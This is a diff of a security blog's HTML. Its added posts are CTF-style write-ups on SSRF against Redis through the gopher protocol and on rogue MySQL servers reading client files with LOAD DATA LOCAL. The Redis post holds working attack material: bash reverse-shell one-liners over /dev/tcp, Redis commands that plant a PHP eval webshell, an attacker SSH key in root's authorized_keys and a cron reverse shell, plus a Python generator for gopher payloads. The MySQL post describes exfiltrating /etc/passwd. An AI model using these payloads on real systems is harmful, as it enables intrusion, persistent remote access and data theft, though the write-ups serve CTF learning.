+<pre><code>http://www.baidu.com@127.0.0.1</code></pre><h1 id="Gopher协议"><a href="#Gopher协议" class="headerlink" title="Gopher协议"></a>Gopher协议</h1><h2 id="定时任务写shell"><a href="#定时任务写shell" class="headerlink" title="定时任务写shell"></a>定时任务写shell</h2><p>crontab 格式 <a href="https://www.jb51.net/LINUXjishu/19905.html" title="参数解释" target="_blank" rel="noopener">https://www.jb51.net/LINUXjishu/19905.html</a></p>
+<p>反弹shell </p>
+<pre><code>/bin/bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1</code></pre><p>利用redis写入</p>
+<pre><code>root@kali:~# cd redis-2.8.3/
+root@kali:~/redis-2.8.3# cd src
+root@kali:~/redis-2.8.3/src# ./redis-cli
+127.0.0.1:6379&gt; * * /bin/bash -i &gt;&amp; /dev/tcp/127.0.0.1/2444 0&gt;&amp;1\n&quot;
+OK
+127.0.0.1:6379&gt; config set dir /var/spool/cron
+OK
+127.0.0.1:6379&gt; config set dbfilename root
+OK
+127.0.0.1:6379&gt; save
+OK
+127.0.0.1:6379&gt; quit</code></pre><h1 id="使用工具无脑生成payload"><a href="#使用工具无脑生成payload" class="headerlink" title="使用工具无脑生成payload"></a>使用工具无脑生成payload</h1><p>先使用<code>./sniffer -p6379</code> 监听网卡，然后在本地redis服务中使用命令，随后断开，sniffer会打印出<code>payload</code></p>
+<p>我们只要加上<code>curl &#39;gopher://127.0.0.1:6379/_payload&#39;</code>即可</p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><blockquote>
+<p><a href="https://xz.aliyun.com/t/5844#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/5844#toc-3</a></p>
+</blockquote>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2019/08/10/redis/">
+                redis与ssrf
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2019-08-10</span>
+            
+            
+                <a href="https://github.com/BrainLyh/2019/08/10/redis/#disqus_thread" class="comments article-comment-link">Comments</a>
+            
+            
+                <span class="category">
+                    <a href="/categories/ctf/">ctf</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <a id="more"></a>
+
+<h1 id="redis协议分析"><a href="#redis协议分析" class="headerlink" title="redis协议分析"></a>redis协议分析</h1><p>tcpdump抓包</p>
+<pre><code>tcpdump -i lo port 6379 -w redis.pcap</code></pre><p>在redis执行如下命令</p>
+<pre><code>127.0.0.1:6379&gt; set name test
+OK
+127.0.0.1:6379&gt; get name
+&quot;test&quot;
+127.0.0.1:6379&gt; </code></pre><h2 id="RESP协议"><a href="#RESP协议" class="headerlink" title="RESP协议"></a>RESP协议</h2><p>RESP在Redis中用作请求-响应协议的方式如下</p>
+<pre><code>1. 客户端将命令作为`Bulk Strings`的RESP数组发送到Redis服务器。
+2. 服务器根据命令实现回复一种RESP类型。</code></pre><p>在RESP中。某些数据的类型取决于第一个字节：</p>
+<ol>
+<li>对于<code>Simple Strings</code>，回复的第一个字节是+</li>
+<li>对于<code>error</code>,回复的第一个字节是-</li>
+<li>对于<code>Integer</code>,，回复的第一个字节是:</li>
+<li>对于<code>Bulk Strings</code>,回复的第一个字节是$</li>
+<li>对于<code>array</code>,回复的第一个字节是*</li>
+<li>此外，resp能够使用稍后指定的<code>Bulk Strings</code>或<code>Array</code>的特殊变体来表示<code>Null</code>值</li>
+<li>在RESP中，协议的不同部分始终以<code>&quot;\r\n&quot;(CRLF)</code>结束</li>
+</ol>
+<p>现在来看一下我们抓的包</p>
+<p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5umo4o02mj30kp0cm0u3.jpg" alt="抓包协议分析1"></p>
+<p><img src="http://wx2.sinaimg.cn/mw690/006boCb9ly1g5umo7bp1qj30kw0bhwfp.jpg" alt="协议分析2"></p>
+<p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5umo9n4wij30kx0b775h.jpg" alt="协议分析3"></p>
+<p><img src="http://wx4.sinaimg.cn/mw690/006boCb9ly1g5umodgmhaj30l409ugml.jpg" alt="协议分析4"></p>
+<p>整体来看一下</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713090053-a9d401f0-a509-1.png" alt="整个通信过程"></p>
+<p>正如我们前面所说的，客户端向将命令作为<code>Bulk Strings</code>的RESP数组发送到Redis服务器，然后服务器根据命令实现回复给客户端一种RESP类型。</p>
+<p>我们就拿上面的数据包分析，首先是<code>*3</code>，代表数组的长度为3（可以简单理解为用空格为分隔符将命令分割为[“set”,”name”,”test”]）；<code>$4</code>代表字符串的长度，<code>0d0a</code>即<code>\r\n</code>表示结束符；<code>+OK</code>表示服务端执行成功后返回的字符串</p>
+<h1 id="Redis配合gopher协议进行SSRF"><a href="#Redis配合gopher协议进行SSRF" class="headerlink" title="Redis配合gopher协议进行SSRF"></a>Redis配合gopher协议进行SSRF</h1><h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><p>能未授权或通过弱口令访问到redis服务器</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>redis常见SSRF攻击方式大概这几种：</p>
+<ol>
+<li>绝对路径写webshell</li>
+<li>写ssh公钥</li>
+<li>写contrab计划任务反弹shell</li>
+</ol>
+<h3 id="绝对路径写webshell"><a href="#绝对路径写webshell" class="headerlink" title="绝对路径写webshell"></a>绝对路径写webshell</h3><p>构造redis命令</p>
+<pre><code>flushall
+set 1 &#39;&lt;?php eval($_GET[&quot;cmd&quot;]);?&gt;&#39;
+config set dir /var/www/html
+config set dbfilename shell.php
+save</code></pre><p>转换为redis RESP格式</p>
+<pre><code>import urllib
+protocol=&quot;gopher://&quot;
+ip=&quot;192.168.163.128&quot;
+port=&quot;6379&quot;
+shell=&quot;\n\n&lt;?php eval($_GET[\&quot;cmd\&quot;]);?&gt;\n\n&quot;
+filename=&quot;shell.php&quot;
+path=&quot;/var/www/html&quot;
+passwd=&quot;&quot;
+cmd=[&quot;flushall&quot;,
+     &quot;set 1 {}&quot;.format(shell.replace(&quot; &quot;,&quot;${IFS}&quot;)),
+     &quot;config set dir {}&quot;.format(path),
+     &quot;config set dbfilename {}&quot;.format(filename),
+     &quot;save&quot;
+     ]
+if passwd:
+    cmd.insert(0,&quot;AUTH {}&quot;.format(passwd))
+payload=protocol+ip+&quot;:&quot;+port+&quot;/_&quot;
+def redis_format(arr):
+    CRLF=&quot;\r\n&quot;
+    redis_arr = arr.split(&quot; &quot;)
+    cmd=&quot;&quot;
+    cmd+=&quot;*&quot;+str(len(redis_arr))
+    for x in redis_arr:
+        cmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;${IFS}&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;${IFS}&quot;,&quot; &quot;)
+    cmd+=CRLF
+    return cmd
+
+if __name__==&quot;__main__&quot;:
+    for x in cmd:
+        payload += urllib.quote(redis_format(x))
+    print payload</code></pre><p>生成之后用curlr然后查询shell是否写入</p>
+<p><img src="http://wx2.sinaimg.cn/mw690/006boCb9ly1g5umog58ioj30bl03a3z1.jpg" alt="写shell"></p>
+<p>写入成功</p>
+<h3 id="写ssh公钥"><a href="#写ssh公钥" class="headerlink" title="写ssh公钥"></a>写ssh公钥</h3><p>如果<code>.ssh</code>目录存在，则直接写入<code>~/.ssh/authorized_keys</code><br>如果不存在，则可以利用<code>crontab</code>创建该目录</p>
+<p>构造redis命令</p>
+<pre><code>flushall
+set 1 &#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGd9qrfBQqsml+aGC/PoXsKGFhW3sucZ81fiESpJ+HSk1ILv+mhmU2QNcopiPiTu+kGqJYjIanrQEFbtL+NiWaAHahSO3cgPYXpQ+lW0FQwStEHyDzYOM3Jq6VMy8PSPqkoIBWc7Gsu6541NhdltPGH202M7PfA6fXyPR/BSq30ixoAT1vKKYMp8+8/eyeJzDSr0iSplzhKPkQBYquoiyIs70CTp7HjNwsE2lKf4WV8XpJm7DHSnnnu+1kqJMw0F/3NqhrxYK8KpPzpfQNpkAhKCozhOwH2OdNuypyrXPf3px06utkTp6jvx3ESRfJ89jmuM9y4WozM3dylOwMWjal root@kali
+&#39;
+config set dir /root/.ssh/
+config set dbfilename authorized_keys
+save</code></pre><p>改第一个脚本</p>
+<pre><code>filename=&quot;authorized_keys&quot;
+ssh_pub=&quot;\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGd9qrfBQqsml+aGC/PoXsKGFhW3sucZ81fiESpJ+HSk1ILv+mhmU2QNcopiPiTu+kGqJYjIanrQEFbtL+NiWaAHahSO3cgPYXpQ+lW0FQwStEHyDzYOM3Jq6VMy8PSPqkoIBWc7Gsu6541NhdltPGH202M7PfA6fXyPR/BSq30ixoAT1vKKYMp8+8/eyeJzDSr0iSplzhKPkQBYquoiyIs70CTp7HjNwsE2lKf4WV8XpJm7DHSnnnu+1kqJMw0F/3NqhrxYK8KpPzpfQNpkAhKCozhOwH2OdNuypyrXPf3px06utkTp6jvx3ESRfJ89jmuM9y4WozM3dylOwMWjal root@kali\n\n&quot;
+path=&quot;/root/.ssh/&quot;</code></pre><p>还是用curl打一发</p>
+<h3 id="利用contrab计划反弹shell"><a href="#利用contrab计划反弹shell" class="headerlink" title="利用contrab计划反弹shell"></a>利用contrab计划反弹shell</h3><p>Centos的定时任务在<code>/var/spool/cron/&lt;username&gt;</code>和/etc/crontab，高版本redis默认启动是redis权限，故无法实现</p>
+<p>构造redis命令</p>
+<pre><code>flushall
+set 1 &#39;\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.163.132/2333 0&gt;&amp;1\n\n&#39;
+config set dir /var/spool/cron/
+config set dbfilename root
+save</code></pre><p>改第一个命令</p>
+<pre><code>reverse_ip=&quot;192.168.163.132&quot;
+reverse_port=&quot;2333&quot;
+cron=&quot;\n\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/%s/%s 0&gt;&amp;1\n\n\n\n&quot;%(reverse_ip,reverse_port)
+filename=&quot;root&quot;
+path=&quot;/var/spool/cron&quot;</code></pre><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><blockquote>
+<p><a href="https://xz.aliyun.com/t/5665#toc-11" target="_blank" rel="noopener">https://xz.aliyun.com/t/5665#toc-11</a><br><a href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf" target="_blank" rel="noopener">https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf</a></p>
+</blockquote>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2019/08/07/MySQL LOAD DATA/">
+                MYSQL LOAD DATA
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2019-08-07</span>
+            
+            
+                <a href="https://github.com/BrainLyh/2019/08/07/MySQL LOAD DATA/#disqus_thread" class="comments article-comment-link">Comments</a>
+            
+            
+                <span class="category">
+                    <a href="/categories/ctf/">ctf</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <a id="more"></a>
+<h1 id="配置mysql"><a href="#配置mysql" class="headerlink" title="配置mysql"></a>配置mysql</h1><h2 id="启动mysql服务"><a href="#启动mysql服务" class="headerlink" title="启动mysql服务"></a>启动mysql服务</h2><pre><code>service mysql start
+
+MariaDB [mysql]&gt; create database test;
+
+MariaDB [test]&gt; create table users(
+    -&gt; id int auto_increment primary key,
+    -&gt; username varchar(30),
+    -&gt; password varchar(30));
+Query OK, 0 rows affected (0.026 sec)
+
+MariaDB [test]&gt; insert into users (id,username,password) values (1,&quot;admin&quot;,&quot;admin&quot;);</code></pre><h2 id="设置密码"><a href="#设置密码" class="headerlink" title="设置密码"></a>设置密码</h2><pre><code>use mysql
+update user set password=PASSWORD(&#39;admin&#39;) where User=&#39;root&#39;;
+flush privileges;
+quit
+service mysql restart
+mysql -h 127.0.0.1 -u root -p  #如果tcpdump抓不到包就尝试设置 -h参数指定为本地回环地址</code></pre><h2 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h2><pre><code>tcpdump -i lo port 3306 -w test.cap</code></pre><p>tcpdump使用指南：<a href="https://www.cnblogs.com/pyng/p/9698723.html" title="tcpdump使用" target="_blank" rel="noopener">https://www.cnblogs.com/pyng/p/9698723.html</a></p>
+<h1 id="LOAD-DATA-INFILE"><a href="#LOAD-DATA-INFILE" class="headerlink" title="LOAD DATA INFILE"></a>LOAD DATA INFILE</h1><p>load data infile 主要是读取一个文件的内容并且放到一个表中，通常有两种用法</p>
+<pre><code>load data infile &quot;/data/data.csv&quot; into table TestTable fields terminated by &#39;分隔符;            //读取服务器文件
+load data local infile &quot;/home/lightless/data.csv&quot; into table TestTable fields terminated by &#39;分隔符; //读取本地文件</code></pre><p>查看官方文档<br><img src="https://upload-images.jianshu.io/upload_images/9113969-2c46042011a696ea.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>我们读取本地文件，并抓取3306端口流量分析</p>
+<p><img src="http://wx4.sinaimg.cn/mw690/006boCb9ly1g5rdhx9h84j30jx02lt9b.jpg" alt="读取本地文件 test.txt"></p>
+<p>文件内容是 <code>hello world!</code></p>
+<p>抓取流量</p>
+<p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5rdhzvg9vj30k602n0u2.jpg" alt="抓取3306端口流量"></p>
+<p>丢进wireshark</p>
+<p><img src="http://wx4.sinaimg.cn/mw690/006boCb9ly1g5rdi51lqsj30l20kz77j.jpg" alt="客户端请求服务器"></p>
+<p>第一个包看起来比较正常，是客户端发起的<code>Request Query</code>，如果你无法使用<code>LOAD DATA INFILE</code>语法的话，考虑在连接 <code>MySQL</code> 的时候加上<code>--enable-local-infile</code>选项，或者设置<code>local_infile</code>全局变量为<code>ON</code>。我们可以看到第一个数据包是客户端发送的请求包，包含了请求命令。</p>
+<p><img src="http://wx3.sinaimg.cn/mw690/006boCb9ly1g5rdi2fq31j30kd0cgjt2.jpg" alt="服务器应答"></p>
+<p>服务器对请求做出响应，响应内容包含了文件名。</p>
+<p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5rdi7lfm1j30kx0dyjtf.jpg" alt="客户端发出请求，发送文件内容"></p>
+<p>客户端发送服务器返回的文件名的文件内容给服务器。</p>
+<p>于是我们想到，如果我们在客户端发送查询之后，返回一个Response TABULAR数据包，并附上我们指定的文件，是不是就可以读取客户端的文件了，答案是肯定的。引用大佬<a href="https://lightless.me/archives/read-mysql-client-file.html" title="大佬" target="_blank" rel="noopener">https://lightless.me/archives/read-mysql-client-file.html</a>的文章</p>
+<blockquote>
+<pre><code>客户端：hi~ 我将把我的 data.csv 文件给你插入到 test 表中！
+服务端：OK，读取你本地 data.csv 文件并发给我！
+客户端：这是文件内容：balabal！</code></pre><p>正常情况下，这个流程不会有什么问题，但是如果我们制作了恶意的客户端，并且回复服务端任意一个我们想要获取的文件，那么情况就不一样了。</p>
+<pre><code>客户端：hi~ 我将把我的 data.csv 文件给你插入到 test 表中！
+服务端：OK，读取你本地的 / etc/passwd 文件并发给我！
+客户端：这是文件内容：balabal（/etc/passwd 文件的内容）！</code></pre></blockquote>
+<p>伪造的服务端可以在任何时候回复一个 file-transfer 请求，不一定非要是在LOAD DATA LOCAL的时候。</p>
+<h1 id="伪造服务端"><a href="#伪造服务端" class="headerlink" title="伪造服务端"></a>伪造服务端</h1><p>利用github上项目： <a href="https://github.com/allyshka/Rogue-MySql-Server">https://github.com/allyshka/Rogue-MySql-Server</a></p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><blockquote>
+<p><a href="https://lightless.me/archives/read-mysql-client-file.html" target="_blank" rel="noopener">https://lightless.me/archives/read-mysql-client-file.html</a><br><a href="https://xz.aliyun.com/t/3277" target="_blank" rel="noopener">https://xz.aliyun.com/t/3277</a><br><a href="https://www.smi1e.top/mysql-load-data-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/" target="_blank" rel="noopener">https://www.smi1e.top/mysql-load-data-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/</a><br><a href="https://xz.aliyun.com/t/3973" target="_blank" rel="noopener">https://xz.aliyun.com/t/3973</a></p>
+</blockquote>
+
+        </div>
+    
+
+</div>
+            
+        </section>
     </div>
 </div>
+
+
+
+    <div class="row">
+        <div class="col-sm-12">
+            <div class="wrap-pagination">
+                <a class="disabled" href="/">
+                    <i class="fa fa-chevron-left" aria-hidden="true"></i>
+                </a>
+                <a class="" href="/page/2/">
+                    <i class="fa fa-chevron-right" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+
+
+
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
+                <h2>About</h2>
+                <p>
+                    This theme was developed by <a href="https://github.com/klugjo">Jonathan Klughertz</a>. The source code is available on Github. Create Websites. Make Magic.
+                </p>
+            </div>
+            
+    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
+        <h2>Recent Posts</h2>
+        <ul>
+            
+            <li>
+                <a class="footer-post" href="/2019/08/31/JavaScript原型污染/">JavaScript Prototype 污染攻击</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2019/08/30/SSTI/">SSTI-服务器端模板注入</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2019/08/22/HostSplit/">HostSplit-Exploitable</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2019/08/19/Black_magic/">black_magic</a>
+            </li>
+            
+        </ul>
+    </div>
+
+
+
+            
+<div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 footer-categories">
+    <h2>Categories</h2>
+    <ul>
+        
+        <li>
+            <a class="footer-post" href="/categories/比赛回顾/">比赛回顾</a>
+        </li>
+        
+        <li>
+            <a class="footer-post" href="/categories/wp/">wp</a>
+        </li>
+        
+        <li>
+            <a class="footer-post" href="/categories/docker/">docker</a>
+        </li>
+        
+        <li>
+            <a class="footer-post" href="/categories/渗透测试/">渗透测试</a>
+        </li>
+        
+    </ul>
+</div>
+
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a href="https://github.com/BrainLyh">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:brainsemail@163.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="\#">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-rss"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    @Untitled. All right reserved | Design & Hexo <a href="http://www.codeblocq.com/">Jonathan Klughertz</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+<script src="/js/main.js"></script>
+
+<!-- Disqus Comments -->
+
+<script type="text/javascript">
+    var disqus_shortname = 'klugjotest';
+
+    (function(){
+        var dsq = document.createElement('script');
+        dsq.type = 'text/javascript';
+        dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/count.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
 
 
 </body>
-<script src="//cdn.bootcss.com/jquery.pjax/2.0.1/jquery.pjax.min.js"></script>
-
-<script src="/js/script.js?v=1.0.1" ></script>
-<script>
-    var img_resize = 'default';
-    /*作者、标签的自动补全*/
-    $(function () {
-        $('.search').AutoComplete({
-            'data': ['#WP','#python','#比赛回顾','#LSB','#MISC','#隐写','#javascript','#mysql load data','#工具','#渗透测试','#redis','#ssrf','#SQL','#SSTI','#Xdebuf','#ctf','#RSA','#docker','#serialize','#php','#弱类型','#命令执行','#zip','#misc','#xxe','#哈希长度扩展攻击',],
-            'itemHeight': 20,
-            'width': 418
-        }).AutoComplete('show');
-    })
-    function initArticle() {
-        /*渲染对应的表格样式*/
-        
-            $(".post .pjax table").addClass("green_title");
-        
-
-        /*渲染打赏样式*/
-        
-        $("input[name=pay]").on("click", function () {
-            if($("input[name=pay]:checked").val()=="weixin"){
-                $(".shang_box .shang_payimg .pay_img").addClass("weixin_img");
-            } else {
-                $(".shang_box .shang_payimg .pay_img").removeClass("weixin_img");
-            }
-        })
-        
-
-        /*高亮代码块行号*/
-        
-        $('pre code').each(function(){
-            var lines = $(this).text().split('\n').length - 1, widther='';
-            if (lines>99) {
-                widther = 'widther'
-            }
-            var $numbering = $('<ul/>').addClass('pre-numbering ' + widther).attr("unselectable","on");
-            $(this).addClass('has-numbering ' + widther)
-                    .parent()
-                    .append($numbering);
-            for(var i=1;i<=lines;i++){
-                $numbering.append($('<li/>').text(i));
-            }
-        });
-        
-
-        /*访问数量*/
-        
-        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
-        
-
-        /*代码高亮，行号对齐*/
-        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
-
-        
-    }
-
-    /*打赏页面隐藏与展示*/
-    
-    function dashangToggle() {
-        $(".shang_box").fadeToggle();
-        $(".hide_box").fadeToggle();
-    }
-    
-
-</script>
-
-<!--加入行号的高亮代码块样式-->
-
-<style>
-    pre{
-        position: relative;
-        margin-bottom: 24px;
-        border-radius: 10px;
-        border: 1px solid #e2dede;
-        background: #FFF;
-        overflow: hidden;
-    }
-    code.has-numbering{
-        margin-left: 30px;
-    }
-    code.has-numbering.widther{
-        margin-left: 35px;
-    }
-    .pre-numbering{
-        margin: 0px;
-        position: absolute;
-        top: 0;
-        left: 0;
-        width: 20px;
-        padding: 0.5em 3px 0.7em 5px;
-        border-right: 1px solid #C3CCD0;
-        text-align: right;
-        color: #AAA;
-        background-color: ;
-    }
-    .pre-numbering.widther {
-        width: 35px;
-    }
-</style>
-
-<!--自定义样式设置-->
-<style>
-    
-    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
-        color: #383636;
-    }
-    
-    
-    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
-        color: #5e5e5f;
-    }
-    
-    
-    .nav-right nav a.hover, #local-search-result a.hover{
-        background-color: #e2e0e0;
-    }
-    
-    
-
-    /*列表样式*/
-    
-    .post .pjax article .article-entry>ol, .post .pjax article .article-entry>ul, .post .pjax article>ol, .post .pjax article>ul{
-        border: #e2dede solid 1px;
-        border-radius: 10px;
-        padding: 10px 32px 10px 56px;
-    }
-    .post .pjax article .article-entry li>ol, .post .pjax article .article-entry li>ul,.post .pjax article li>ol, .post .pjax article li>ul{
-        padding-top: 5px;
-        padding-bottom: 5px;
-    }
-    .post .pjax article .article-entry>ol>li, .post .pjax article .article-entry>ul>li,.post .pjax article>ol>li, .post .pjax article>ul>li{
-        margin-bottom: auto;
-        margin-left: auto;
-    }
-    .post .pjax article .article-entry li>ol>li, .post .pjax article .article-entry li>ul>li,.post .pjax article li>ol>li, .post .pjax article li>ul>li{
-        margin-bottom: auto;
-        margin-left: auto;
-    }
-    
-
-    /* 背景图样式 */
-    
-    
-
-
-    /*引用块样式*/
-    
-
-    /*文章列表背景图*/
-    
-    .nav-right:before {
-        content: ' ';
-        display: block;
-        position: absolute;
-        left: 0;
-        top: 0;
-        width: 100%;
-        height: 100%;
-        opacity: 0.5;
-        background: url("http://wx3.sinaimg.cn/mw690/006boCb9ly1g5kej6ap1bj31hc0u0wn6.jpg");
-        background-repeat: no-repeat;
-        background-position: 50% 0;
-        -ms-background-size: cover;
-        -o-background-size: cover;
-        -moz-background-size: cover;
-        -webkit-background-size: cover;
-        background-size: cover;
-    }
-    
-
-    
-</style>
-
-
-
-
-
-
 
 </html>
